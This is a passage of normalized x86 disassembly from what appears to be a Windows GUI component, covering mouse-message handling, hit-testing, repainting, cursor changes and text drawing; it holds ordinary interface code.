or [ eax + 0x20 ] 0x1
mov esi [ edi + 0x260 ]
mov ecx [ edi + 0x18c ]
push edi
call sub_438a30
cmp [ edi + 0x158 ] 0x0
je r-xdata
mov ecx [ edi + 0x18c ]
push edi
call sub_438a30
cmp [ edi + 0x158 ] 0x0
je r-xdata
mov esi [ edx ]
test [ esi + 0x20 ] 0x1
jne r-xdata
jmp r-xdata
mov ecx 0x7
call sub_41ae80
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x18 ]
mov eax [ ecx ]
mov edx [ eax + 0x58 ]
call edx
test eax eax
je r-xdata
cmp [ edi + 0x1a0 ] 0x0
je r-xdata
cmp [ edi + 0x1a0 ] 0x0
je r-xdata
mov ecx [ edi + 0x260 ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx ]
mov edx [ eax ]
mov edx [ edx + 0x10 ]
push esi
push ecx
push 0x935
push edi
mov ecx eax
call edx
mov eax [ edi + 0x260 ]
mov ecx [ edi + 0x15c ]
push 0x0
add eax 0x10
push eax
push ecx
call [ InvalidateRect@IAT ]
mov edx [ edi + 0x15c ]
push edx
call [ UpdateWindow@IAT ]
mov eax [ edi + 0x15c ]
push 0x0
add esi 0x10
push esi
push eax
call [ InvalidateRect@IAT ]
mov ecx [ edi + 0x15c ]
push ecx
call [ UpdateWindow@IAT ]
sub_4393f0
push ecx
mov eax [ edi + 0x25c ]
push ebx
push esi
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
retn
mov ecx [ eax + 0x2c ]
sub ecx [ eax + 0x28 ]
test ecx 0xfffffffc
jle r-xdata
mov edx [ eax + 0x28 ]
mov ebx [ edx ]
test ebx ebx
je r-xdata
mov eax [ edi + 0x264 ]
test eax eax
je r-xdata
mov [ edi + 0x264 ] ebx
or [ ebx + 0x20 ] 0x1
mov esi [ edi + 0x264 ]
mov ecx [ edi + 0x18c ]
push edi
call sub_438a30
cmp [ edi + 0x158 ] 0x0
je r-xdata
cmp ebx eax
je r-xdata
mov ecx [ edi + 0x18 ]
mov eax [ ecx ]
mov edx [ eax + 0x58 ]
call edx
test eax eax
je r-xdata
cmp [ edi + 0x1a0 ] 0x0
je r-xdata
and [ eax + 0x20 ] 0xfffffffe
mov ecx [ edi + 0x24c ]
sub ecx [ edi + 0x248 ]
mov esi [ edi + 0x264 ]
mov eax [ esi ]
sar ecx 0x2
cmp eax ecx
jae r-xdata
mov ecx [ edi + 0x264 ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx ]
mov edx [ eax ]
mov edx [ edx + 0x10 ]
push esi
push ecx
push 0x935
push edi
mov ecx eax
call edx
mov eax [ edi + 0x264 ]
mov ecx [ edi + 0x15c ]
push 0x0
add eax 0x10
push eax
push ecx
call [ InvalidateRect@IAT ]
mov edx [ edi + 0x15c ]
push edx
call [ UpdateWindow@IAT ]
mov [ edi + 0x264 ] 0x0
mov edx [ edi + 0x248 ]
mov eax [ edx + eax * 4 ]
test eax eax
je r-xdata
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov ecx [ edi + 0x18c ]
push edi
call sub_438a30
mov eax [ edi + 0x264 ]
lea esi [ edi + 0x154 ]
add eax 0x10
call sub_41af80
sub_439580
push ebp
mov ebp esp
push 0xffffffff
push sub_44a196
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_42c0c0
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
mov [ esi + 0x248 ] eax
mov [ esi + 0x24c ] eax
mov [ esi + 0x250 ] eax
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x220 ] r--data
mov [ esi + 0xc ] 0x49
mov [ esi + 0x258 ] eax
mov [ esi + 0x268 ] eax
mov [ esi + 0x26c ] al
mov [ esi + 0x264 ] 0x13
mov [ esi + 0x235 ] al
mov [ esi + 0x270 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_439650
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_439680
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_439680
push ebp
mov ebp esp
push 0xffffffff
push sub_44a15e
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
xor edi edi
mov [ ebp - 0x4 ] edi
mov eax [ esi + 0x248 ]
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ esi + 0x248 ] edi
mov [ esi + 0x24c ] edi
mov [ esi + 0x250 ] edi
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
mov [ ebp - 0x4 ] eax
mov ecx esi
call sub_418cc0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push eax
call [ operator delete@IAT ]
add esp 0x4
sub_439760
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x69 ] 0x0
push edi
mov edi [ ebp + 0x8 ]
je r-xdata
mov eax [ ebp + 0xc ]
push eax
push edi
call sub_40e4c0
cmp [ esi + 0x158 ] 0x0
mov eax [ esi + 0x4 ]
mov [ esi + 0x244 ] edi
mov ecx [ eax + 0x70 ]
mov [ esi + 0x194 ] ecx
mov edx [ eax + 0x80 ]
mov [ esi + 0x198 ] edx
je r-xdata
mov [ edi + 0x40 ] 0x1
mov [ esi + 0x25c ] edi
test edi edi
je r-xdata
movzx eax [ edi + 0xf6 ]
mov [ esi + 0x158 ] eax
pop edi
pop esi
pop ebp
retn 0x8
mov ecx [ edi + 0xfc ]
mov [ esi + 0x260 ] ecx
sub_4397e0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x25 ] 0x0
push edi
mov [ esi + 0x24 ] 0x1
jne r-xdata
mov edi [ esi + 0x4 ]
push ebx
lea ecx [ edi + 0xb0 ]
lea ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
mov [ ebp + 0x8 ] 0x0
call sub_414260
mov eax [ ebp - 0x4 ]
pop ebx
cmp eax [ edi + 0xb4 ]
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x18 ] ecx
test ecx ecx
je r-xdata
pop edi
mov [ esi + 0x264 ] 0x13
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edi [ eax + 0x10 ]
test edi edi
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x58 ]
call edx
mov [ esi + 0x1c ] eax
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ edi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx edi
call edx
mov eax [ edi + 0x10 ]
mov [ esi + 0x268 ] eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x54 ]
push esi
call eax
sub_439870
push ebp
mov ebp esp
push 0xffffffff
push sub_4457e1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ edi + 0x24c ]
sub eax [ edi + 0x248 ]
mov [ ebp - 0x10 ] 0x0
sar eax 0x2
test eax eax
je r-xdata
mov ecx [ edi + 0x24c ]
mov ebx [ edi + 0x248 ]
cmp ebx ecx
je r-xdata
mov ecx [ edi + 0x248 ]
mov edx [ ebp - 0x10 ]
mov esi [ ecx + edx * 4 ]
mov eax [ esi + 0x8 ]
sub eax [ esi + 0x4 ]
xor ebx ebx
sar eax 0x2
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ecx
sub eax ecx
sar eax 0x2
lea esi [ eax * 4 ]
push esi
push ecx
push ebx
call [ memmove@IAT ]
add esp 0xc
add esi ebx
mov [ edi + 0x24c ] esi
mov ecx [ esi + 0x8 ]
mov ebx [ esi + 0x4 ]
cmp ebx ecx
je r-xdata
mov ecx [ esi + 0x4 ]
mov edi [ ecx + ebx * 4 ]
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax ecx
sub eax ecx
sar eax 0x2
lea edi [ eax * 4 ]
push edi
push ecx
push ebx
call [ memmove@IAT ]
add esp 0xc
add edi ebx
mov [ esi + 0x8 ] edi
mov edi [ ebp - 0x14 ]
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x24 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ edi + 0x38 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
xor eax eax
push esi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
call [ operator delete@IAT ]
mov edx [ edi + 0x24c ]
sub edx [ edi + 0x248 ]
mov eax [ ebp - 0x10 ]
inc eax
sar edx 0x2
add esp 0x4
mov [ ebp - 0x10 ] eax
cmp eax edx
jb r-xdata
push eax
call [ operator delete@IAT ]
add esp 0x4
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
lea eax [ edi + 0x8 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
push edi
call [ operator delete@IAT ]
mov ecx [ esi + 0x8 ]
sub ecx [ esi + 0x4 ]
inc ebx
sar ecx 0x2
add esp 0x4
cmp ebx ecx
jb r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov edi [ ebp - 0x14 ]
sub_439a30
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ebx
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x74 ]
push edi
call edx
test al al
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ebx [ ebp + 0xc ]
mov [ esp + 0xf ] 0x0
cmp ebx 0x20
jne r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
push eax
push ebx
push ecx
mov ecx esi
call sub_418fb0
cmp ebx 0x5
jne r-xdata
cmp [ esi + 0x258 ] 0x0
je r-xdata
cmp ebx 0x2a3
jne r-xdata
mov edx edi
shr edx 0x10
movsx ecx dx
mov edx [ esi ]
mov edx [ edx + 0xb4 ]
movsx eax di
push ecx
push eax
mov eax [ ebp + 0x10 ]
push eax
mov ecx esi
call edx
lea ecx [ esp + 0xf ]
call sub_43a0d0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ esi + 0x27 ] 0x0
je r-xdata
xor eax eax
cmp [ esi + 0x258 ] eax
je r-xdata
mov eax [ esi + 0x24c ]
sub eax [ esi + 0x248 ]
test eax 0xfffffffc
je r-xdata
mov [ esi + 0x258 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax esi
call sub_439df0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp ebx 0x200
jne r-xdata
cmp ebx 0x201
jne r-xdata
push edi
mov ecx esi
call sub_439b60
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp ebx 0x202
jne r-xdata
push edi
mov ecx esi
call sub_43a030
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push edi
mov ecx esi
call sub_439e60
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_439b60
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
push esi
movsx ebx ax
shr eax 0x10
push edi
mov edi ecx
mov esi [ edi + 0x258 ]
cwde
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] eax
test esi esi
je r-xdata
mov edx [ edi + 0x24c ]
sub edx [ edi + 0x248 ]
xor ecx ecx
sar edx 0x2
mov [ esp + 0x10 ] ecx
test edx edx
je r-xdata
push eax
lea ecx [ esi + 0x10 ]
push ebx
push ecx
mov [ esp + 0x1c ] ecx
call [ PtInRect@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi + 0x248 ]
mov eax [ eax + ecx * 4 ]
mov edx [ eax + 0x8 ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x1c ] eax
sar edx 0x2
mov [ esp + 0xc ] 0x0
test edx edx
je r-xdata
mov eax [ esi + 0x20 ]
test al 0x2
je r-xdata
mov ecx [ esp + 0x18 ]
push ecx
lea eax [ esi + 0x3c ]
push ebx
push eax
mov [ esp + 0x18 ] eax
call [ PtInRect@IAT ]
test eax eax
mov eax [ esi + 0x4c ]
je r-xdata
mov eax [ edi + 0x24c ]
sub eax [ edi + 0x248 ]
inc ecx
sar eax 0x2
mov [ esp + 0x10 ] ecx
cmp ecx eax
jb r-xdata
jmp r-xdata
mov [ edi + 0x258 ] 0x0
and eax 0xfffffffd
mov [ esi + 0x20 ] eax
mov [ esi + 0x4c ] 0x0
mov ecx [ edi + 0x18c ]
push ecx
mov ecx esi
call sub_43a410
cmp [ edi + 0x158 ] 0x0
je r-xdata
test al 0x2
je r-xdata
test al 0x2
jne r-xdata
mov eax [ eax + 0x4 ]
mov ecx [ esp + 0xc ]
mov esi [ eax + ecx * 4 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
push edx
push eax
lea ebx [ esi + 0x10 ]
push ebx
call [ PtInRect@IAT ]
test eax eax
je r-xdata
cmp [ edi + 0x1a0 ] 0x0
je r-xdata
and eax 0xfffffffd
cmp [ esi + 0x38 ] 0x0
mov [ esi + 0x4c ] eax
je r-xdata
or eax 0x2
cmp [ esi + 0x38 ] 0x0
mov [ esi + 0x4c ] eax
je r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ ecx + 0x8 ]
sub edx [ ecx + 0x4 ]
mov eax [ esp + 0xc ]
inc eax
sar edx 0x2
mov [ esp + 0xc ] eax
cmp eax edx
jb r-xdata
mov [ edi + 0x258 ] esi
mov eax [ esi + 0x20 ]
test al 0x2
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ edi + 0x15c ]
push 0x0
push edx
push eax
call [ InvalidateRect@IAT ]
mov ecx [ edi + 0x15c ]
push ecx
call [ UpdateWindow@IAT ]
mov eax [ esp + 0xc ]
lea esi [ edi + 0x154 ]
call sub_41af80
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi + 0x18c ]
push eax
mov edx [ edi + 0x18c ]
push edx
jmp r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push ecx
push edx
lea ebx [ esi + 0x3c ]
push ebx
call [ PtInRect@IAT ]
test eax eax
je r-xdata
or eax 0x2
mov [ esi + 0x20 ] eax
mov ecx [ edi + 0x18c ]
push ecx
mov ecx esi
call sub_43a410
cmp [ edi + 0x158 ] 0x0
je r-xdata
call sub_43a790
mov eax [ esi + 0x4c ]
test al 0x2
jne r-xdata
cmp [ edi + 0x1a0 ] 0x0
je r-xdata
or eax 0x2
cmp [ esi + 0x38 ] 0x0
mov [ esi + 0x4c ] eax
je r-xdata
mov edx [ edi + 0x15c ]
push 0x0
push ebx
push edx
call [ InvalidateRect@IAT ]
mov eax [ edi + 0x15c ]
push eax
call [ UpdateWindow@IAT ]
cmp [ edi + 0x158 ] 0x0
je r-xdata
mov eax [ edi + 0x18c ]
push eax
call sub_43a790
cmp [ edi + 0x1a0 ] 0x0
je r-xdata
mov ecx [ edi + 0x15c ]
push 0x0
push ebx
push ecx
call [ InvalidateRect@IAT ]
mov edx [ edi + 0x15c ]
push edx
call [ UpdateWindow@IAT ]
sub_439df0
push edi
mov edi eax
mov eax [ edi + 0x258 ]
test [ eax + 0x20 ] 0x2
je r-xdata
xor eax eax
mov [ edi + 0x258 ] eax
pop edi
retn
and [ eax + 0x20 ] 0xfffffffd
mov eax [ edi + 0x18c ]
mov ecx [ edi + 0x258 ]
push eax
call sub_43a410
cmp [ edi + 0x158 ] 0x0
je r-xdata
cmp [ edi + 0x1a0 ] 0x0
je r-xdata
mov ecx [ edi + 0x258 ]
mov edx [ edi + 0x15c ]
push 0x0
add ecx 0x10
push ecx
push edx
call [ InvalidateRect@IAT ]
mov eax [ edi + 0x15c ]
push eax
call [ UpdateWindow@IAT ]
sub_439e60
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
mov ebx [ edi + 0x258 ]
movsx ecx ax
shr eax 0x10
cwde
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] eax
test ebx ebx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
test al 0x4
je r-xdata
push eax
lea edx [ ebx + 0x3c ]
push ecx
push edx
call [ PtInRect@IAT ]
test eax eax
je r-xdata
mov eax [ edi + 0x248 ]
mov edx [ edi + 0x24c ]
sub edx eax
xor ecx ecx
sar edx 0x2
mov [ esp + 0x14 ] ecx
test edx edx
je r-xdata
and eax 0xfffffffb
mov [ ebx + 0x20 ] eax
test al 0x1
jne r-xdata
mov eax [ ebx + 0x4c ]
test al 0x4
je r-xdata
mov eax [ eax + ecx * 4 ]
mov edx [ eax + 0x8 ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x10 ] eax
sar edx 0x2
mov [ esp + 0xc ] 0x0
test edx edx
je r-xdata
mov edx [ ebx + 0x4 ]
push edx
mov edx [ ebx ]
or eax 0x1
mov [ ebx + 0x20 ] eax
mov ecx [ edi + 0x1c ]
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
push edx
push 0x935
push edi
call eax
and eax 0xfffffffb
cmp [ ebx + 0x38 ] 0x0
mov [ ebx + 0x4c ] eax
je r-xdata
mov eax [ edi + 0x248 ]
mov edx [ edi + 0x24c ]
sub edx eax
inc ecx
sar edx 0x2
mov [ esp + 0x14 ] ecx
cmp ecx edx
jb r-xdata
jmp r-xdata
lea esi [ edi + 0x154 ]
lea eax [ ebx + 0x3c ]
call sub_41af80
mov eax [ ebx + 0x4 ]
mov ecx [ edi + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x10 ]
push eax
mov eax [ ebx ]
push eax
push 0x936
push edi
call edx
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi + 0x18c ]
push eax
mov esi ebx
call sub_43a790
mov eax [ eax + 0x4 ]
mov ecx [ esp + 0xc ]
mov esi [ eax + ecx * 4 ]
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
push edx
push eax
lea ebx [ esi + 0x10 ]
push ebx
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ ecx + 0x8 ]
sub edx [ ecx + 0x4 ]
mov eax [ esp + 0xc ]
inc eax
sar edx 0x2
mov [ esp + 0xc ] eax
cmp eax edx
jb r-xdata
mov eax [ esi + 0x20 ]
test al 0x1
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
and eax 0xfffffffe
mov [ esi + 0x20 ] eax
mov ecx [ edi + 0x18c ]
push ecx
mov ecx esi
call sub_43a410
cmp [ edi + 0x158 ] 0x0
je r-xdata
cmp [ edi + 0x1a0 ] 0x0
je r-xdata
mov edx [ edi + 0x15c ]
push 0x0
push ebx
push edx
call [ InvalidateRect@IAT ]
mov eax [ edi + 0x15c ]
push eax
call [ UpdateWindow@IAT ]
sub_43a030
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
mov eax [ ebp + 0x8 ]
push ebx
push esi
movsx ebx ax
shr eax 0x10
push edi
mov edi ecx
mov esi [ edi + 0x258 ]
cwde
mov [ esp + 0x14 ] eax
test esi esi
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x20 ]
test al 0x4
jne r-xdata
cmp [ esi + 0x38 ] 0x0
je r-xdata
or eax 0x4
mov [ esi + 0x20 ] eax
mov ecx [ edi + 0x18c ]
push ecx
mov ecx esi
call sub_43a410
mov edx [ esp + 0x14 ]
push edx
lea eax [ esi + 0x3c ]
push ebx
push eax
mov [ esp + 0x18 ] eax
call [ PtInRect@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x4c ]
test al 0x4
jne r-xdata
or eax 0x4
cmp [ esi + 0x38 ] 0x0
mov [ esi + 0x4c ] eax
je r-xdata
mov eax [ esp + 0xc ]
lea esi [ edi + 0x154 ]
call sub_41af80
mov eax [ edi + 0x18c ]
push eax
call sub_43a790
sub_43a0d0
mov eax [ esi + 0x258 ]
test [ eax + 0x4c ] 0x2
je r-xdata
xor eax eax
retn
mov edx [ esi + 0x4 ]
cmp [ edx + 0x5c ] 0x0
mov [ ecx ] 0x1
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x5c ]
push eax
call [ SetCursor@IAT ]
mov [ esi + 0x21c ] 0x1
mov eax 0x1
retn
push 0x7f89
push 0x0
call [ LoadCursorW@IAT ]
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x5c ] eax
sub_43a120
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
push ebx
push esi
push edi
mov edi ecx
xor eax eax
mov [ esp + 0x10 ] edi
cmp [ edi + 0x114 ] eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ edi - 0x11c ]
mov ecx [ edi - 0x124 ]
mov ebx [ edi - 0x120 ]
mov [ esp + 0x28 ] edx
mov edx [ edi + 0xf8 ]
sub edx [ edi + 0xf4 ]
mov [ esp + 0x20 ] ecx
mov ecx [ edi - 0x118 ]
sar edx 0x2
mov [ esp + 0x2c ] ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
test edx edx
je r-xdata
mov ecx [ edi + 0xf4 ]
mov esi [ ecx + eax * 4 ]
mov edx [ esp + 0x18 ]
mov [ esp + 0x14 ] esi
cmp [ esi ] edx
je r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi + 0x4 ]
add ebx 0x7
xor eax eax
sar ecx 0x2
mov [ esp + 0x24 ] ebx
mov [ esp + 0xc ] eax
test ecx ecx
je r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x28 ]
sub esp 0x10
mov eax esp
mov [ eax ] ecx
mov ecx [ esp + 0x3c ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
mov edx [ ebp + 0x8 ]
push edx
mov [ eax + 0xc ] ecx
call sub_43a350
mov ecx [ edi + 0xf8 ]
sub ecx [ edi + 0xf4 ]
mov eax [ esp + 0x1c ]
inc eax
sar ecx 0x2
mov [ esp + 0x1c ] eax
cmp eax ecx
jb r-xdata
jmp r-xdata
mov edx [ esi + 0x4 ]
mov esi [ edx + eax * 4 ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x28 ]
mov [ esi + 0x10 ] ecx
mov ecx [ esp + 0x2c ]
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] edx
mov [ esi + 0x1c ] ecx
test eax eax
je r-xdata
mov eax [ edi + 0x114 ]
mov ebx [ esi + 0x14 ]
mov edi [ esi + 0x38 ]
add eax ebx
mov [ esi + 0x1c ] eax
test edi edi
je r-xdata
mov edx [ edi + 0x114 ]
inc edx
imul edx eax
add [ esi + 0x14 ] edx
mov eax [ esi + 0x24 ]
mov ecx r--data
mov ecx [ esi + 0x18 ]
sub ecx 0x8
mov [ esi + 0x44 ] ecx
mov edx [ edi ]
mov eax [ edi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx edi
call edx
mov ecx [ esi + 0x44 ]
mov ebx [ esi + 0x14 ]
mov eax 0x66666667
imul [ edi + 0xc ]
mov edi [ edi + 0x10 ]
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
sub ecx eax
mov [ esi + 0x3c ] ecx
mov eax [ esi + 0x1c ]
sub eax ebx
sub eax edi
cdq
sub eax edx
sar eax 0x1
add eax ebx
mov [ esi + 0x40 ] eax
add eax edi
mov [ esi + 0x48 ] eax
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
mov edx [ ebp + 0x8 ]
mov edi [ esp + 0x10 ]
push edx
mov ecx esi
add edi 0xfffffeac
call sub_43a410
mov ecx [ esp + 0x14 ]
mov eax [ ecx + 0x8 ]
sub eax [ ecx + 0x4 ]
mov ecx [ esp + 0xc ]
sar eax 0x2
lea edx [ eax - 0x1 ]
cmp ecx edx
jne r-xdata
mov eax [ esi + 0x18 ]
add eax 0xfffffff3
mov [ esi + 0x30 ] eax
add eax 0xffffffd8
mov [ esi + 0x28 ] eax
mov eax [ esi + 0x1c ]
sub eax [ esi + 0x14 ]
sub eax 0xb
cdq
sub eax edx
sar eax 0x1
add eax ebx
mov [ esi + 0x2c ] eax
add eax 0xb
mov [ esi + 0x34 ] eax
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov edx [ esi ]
mov ebx [ esp + 0x24 ]
mov edi [ esp + 0x10 ]
inc ecx
mov [ esp + 0x18 ] edx
mov [ esp + 0xc ] ecx
cmp ecx eax
jb r-xdata
mov edx [ esi + 0x1c ]
mov [ esp + 0x24 ] edx
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov esi [ esp + 0x14 ]
mov eax [ esp + 0xc ]
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sub_43a350
push ebp
mov ebp esp
push 0xffffffff
push sub_445785
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x18 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x20 ] edx
add edx 0x3
mov [ ebp - 0x20 ] edx
sub esi 0xa
mov [ ebp - 0x18 ] edi
add ecx 0xa
inc edx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x18 ] edx
mov esi [ eax ]
mov [ ebp - 0x4 ] 0x0
mov ebx [ SetBkColor@IAT ]
push 0xc4c4c4
push esi
call ebx
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x14
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x24 ]
push ecx
push 0x2
push 0x0
push 0x0
push esi
call [ ExtTextOutW@IAT ]
push edi
push esi
call ebx
sub_43a410
push ebp
mov ebp esp
push 0xffffffff
push sub_446965
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi ecx
mov edx [ esi + 0x10 ]
mov [ ebp - 0x60 ] eax
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x5c ] ecx
mov ecx [ esi + 0x14 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ esi + 0x1c ]
mov [ ebp - 0x24 ] edx
mov edx [ esi + 0x18 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ esi + 0x20 ]
mov [ ebp - 0x1c ] edx
xor edx edx
mov [ ebp - 0x44 ] edx
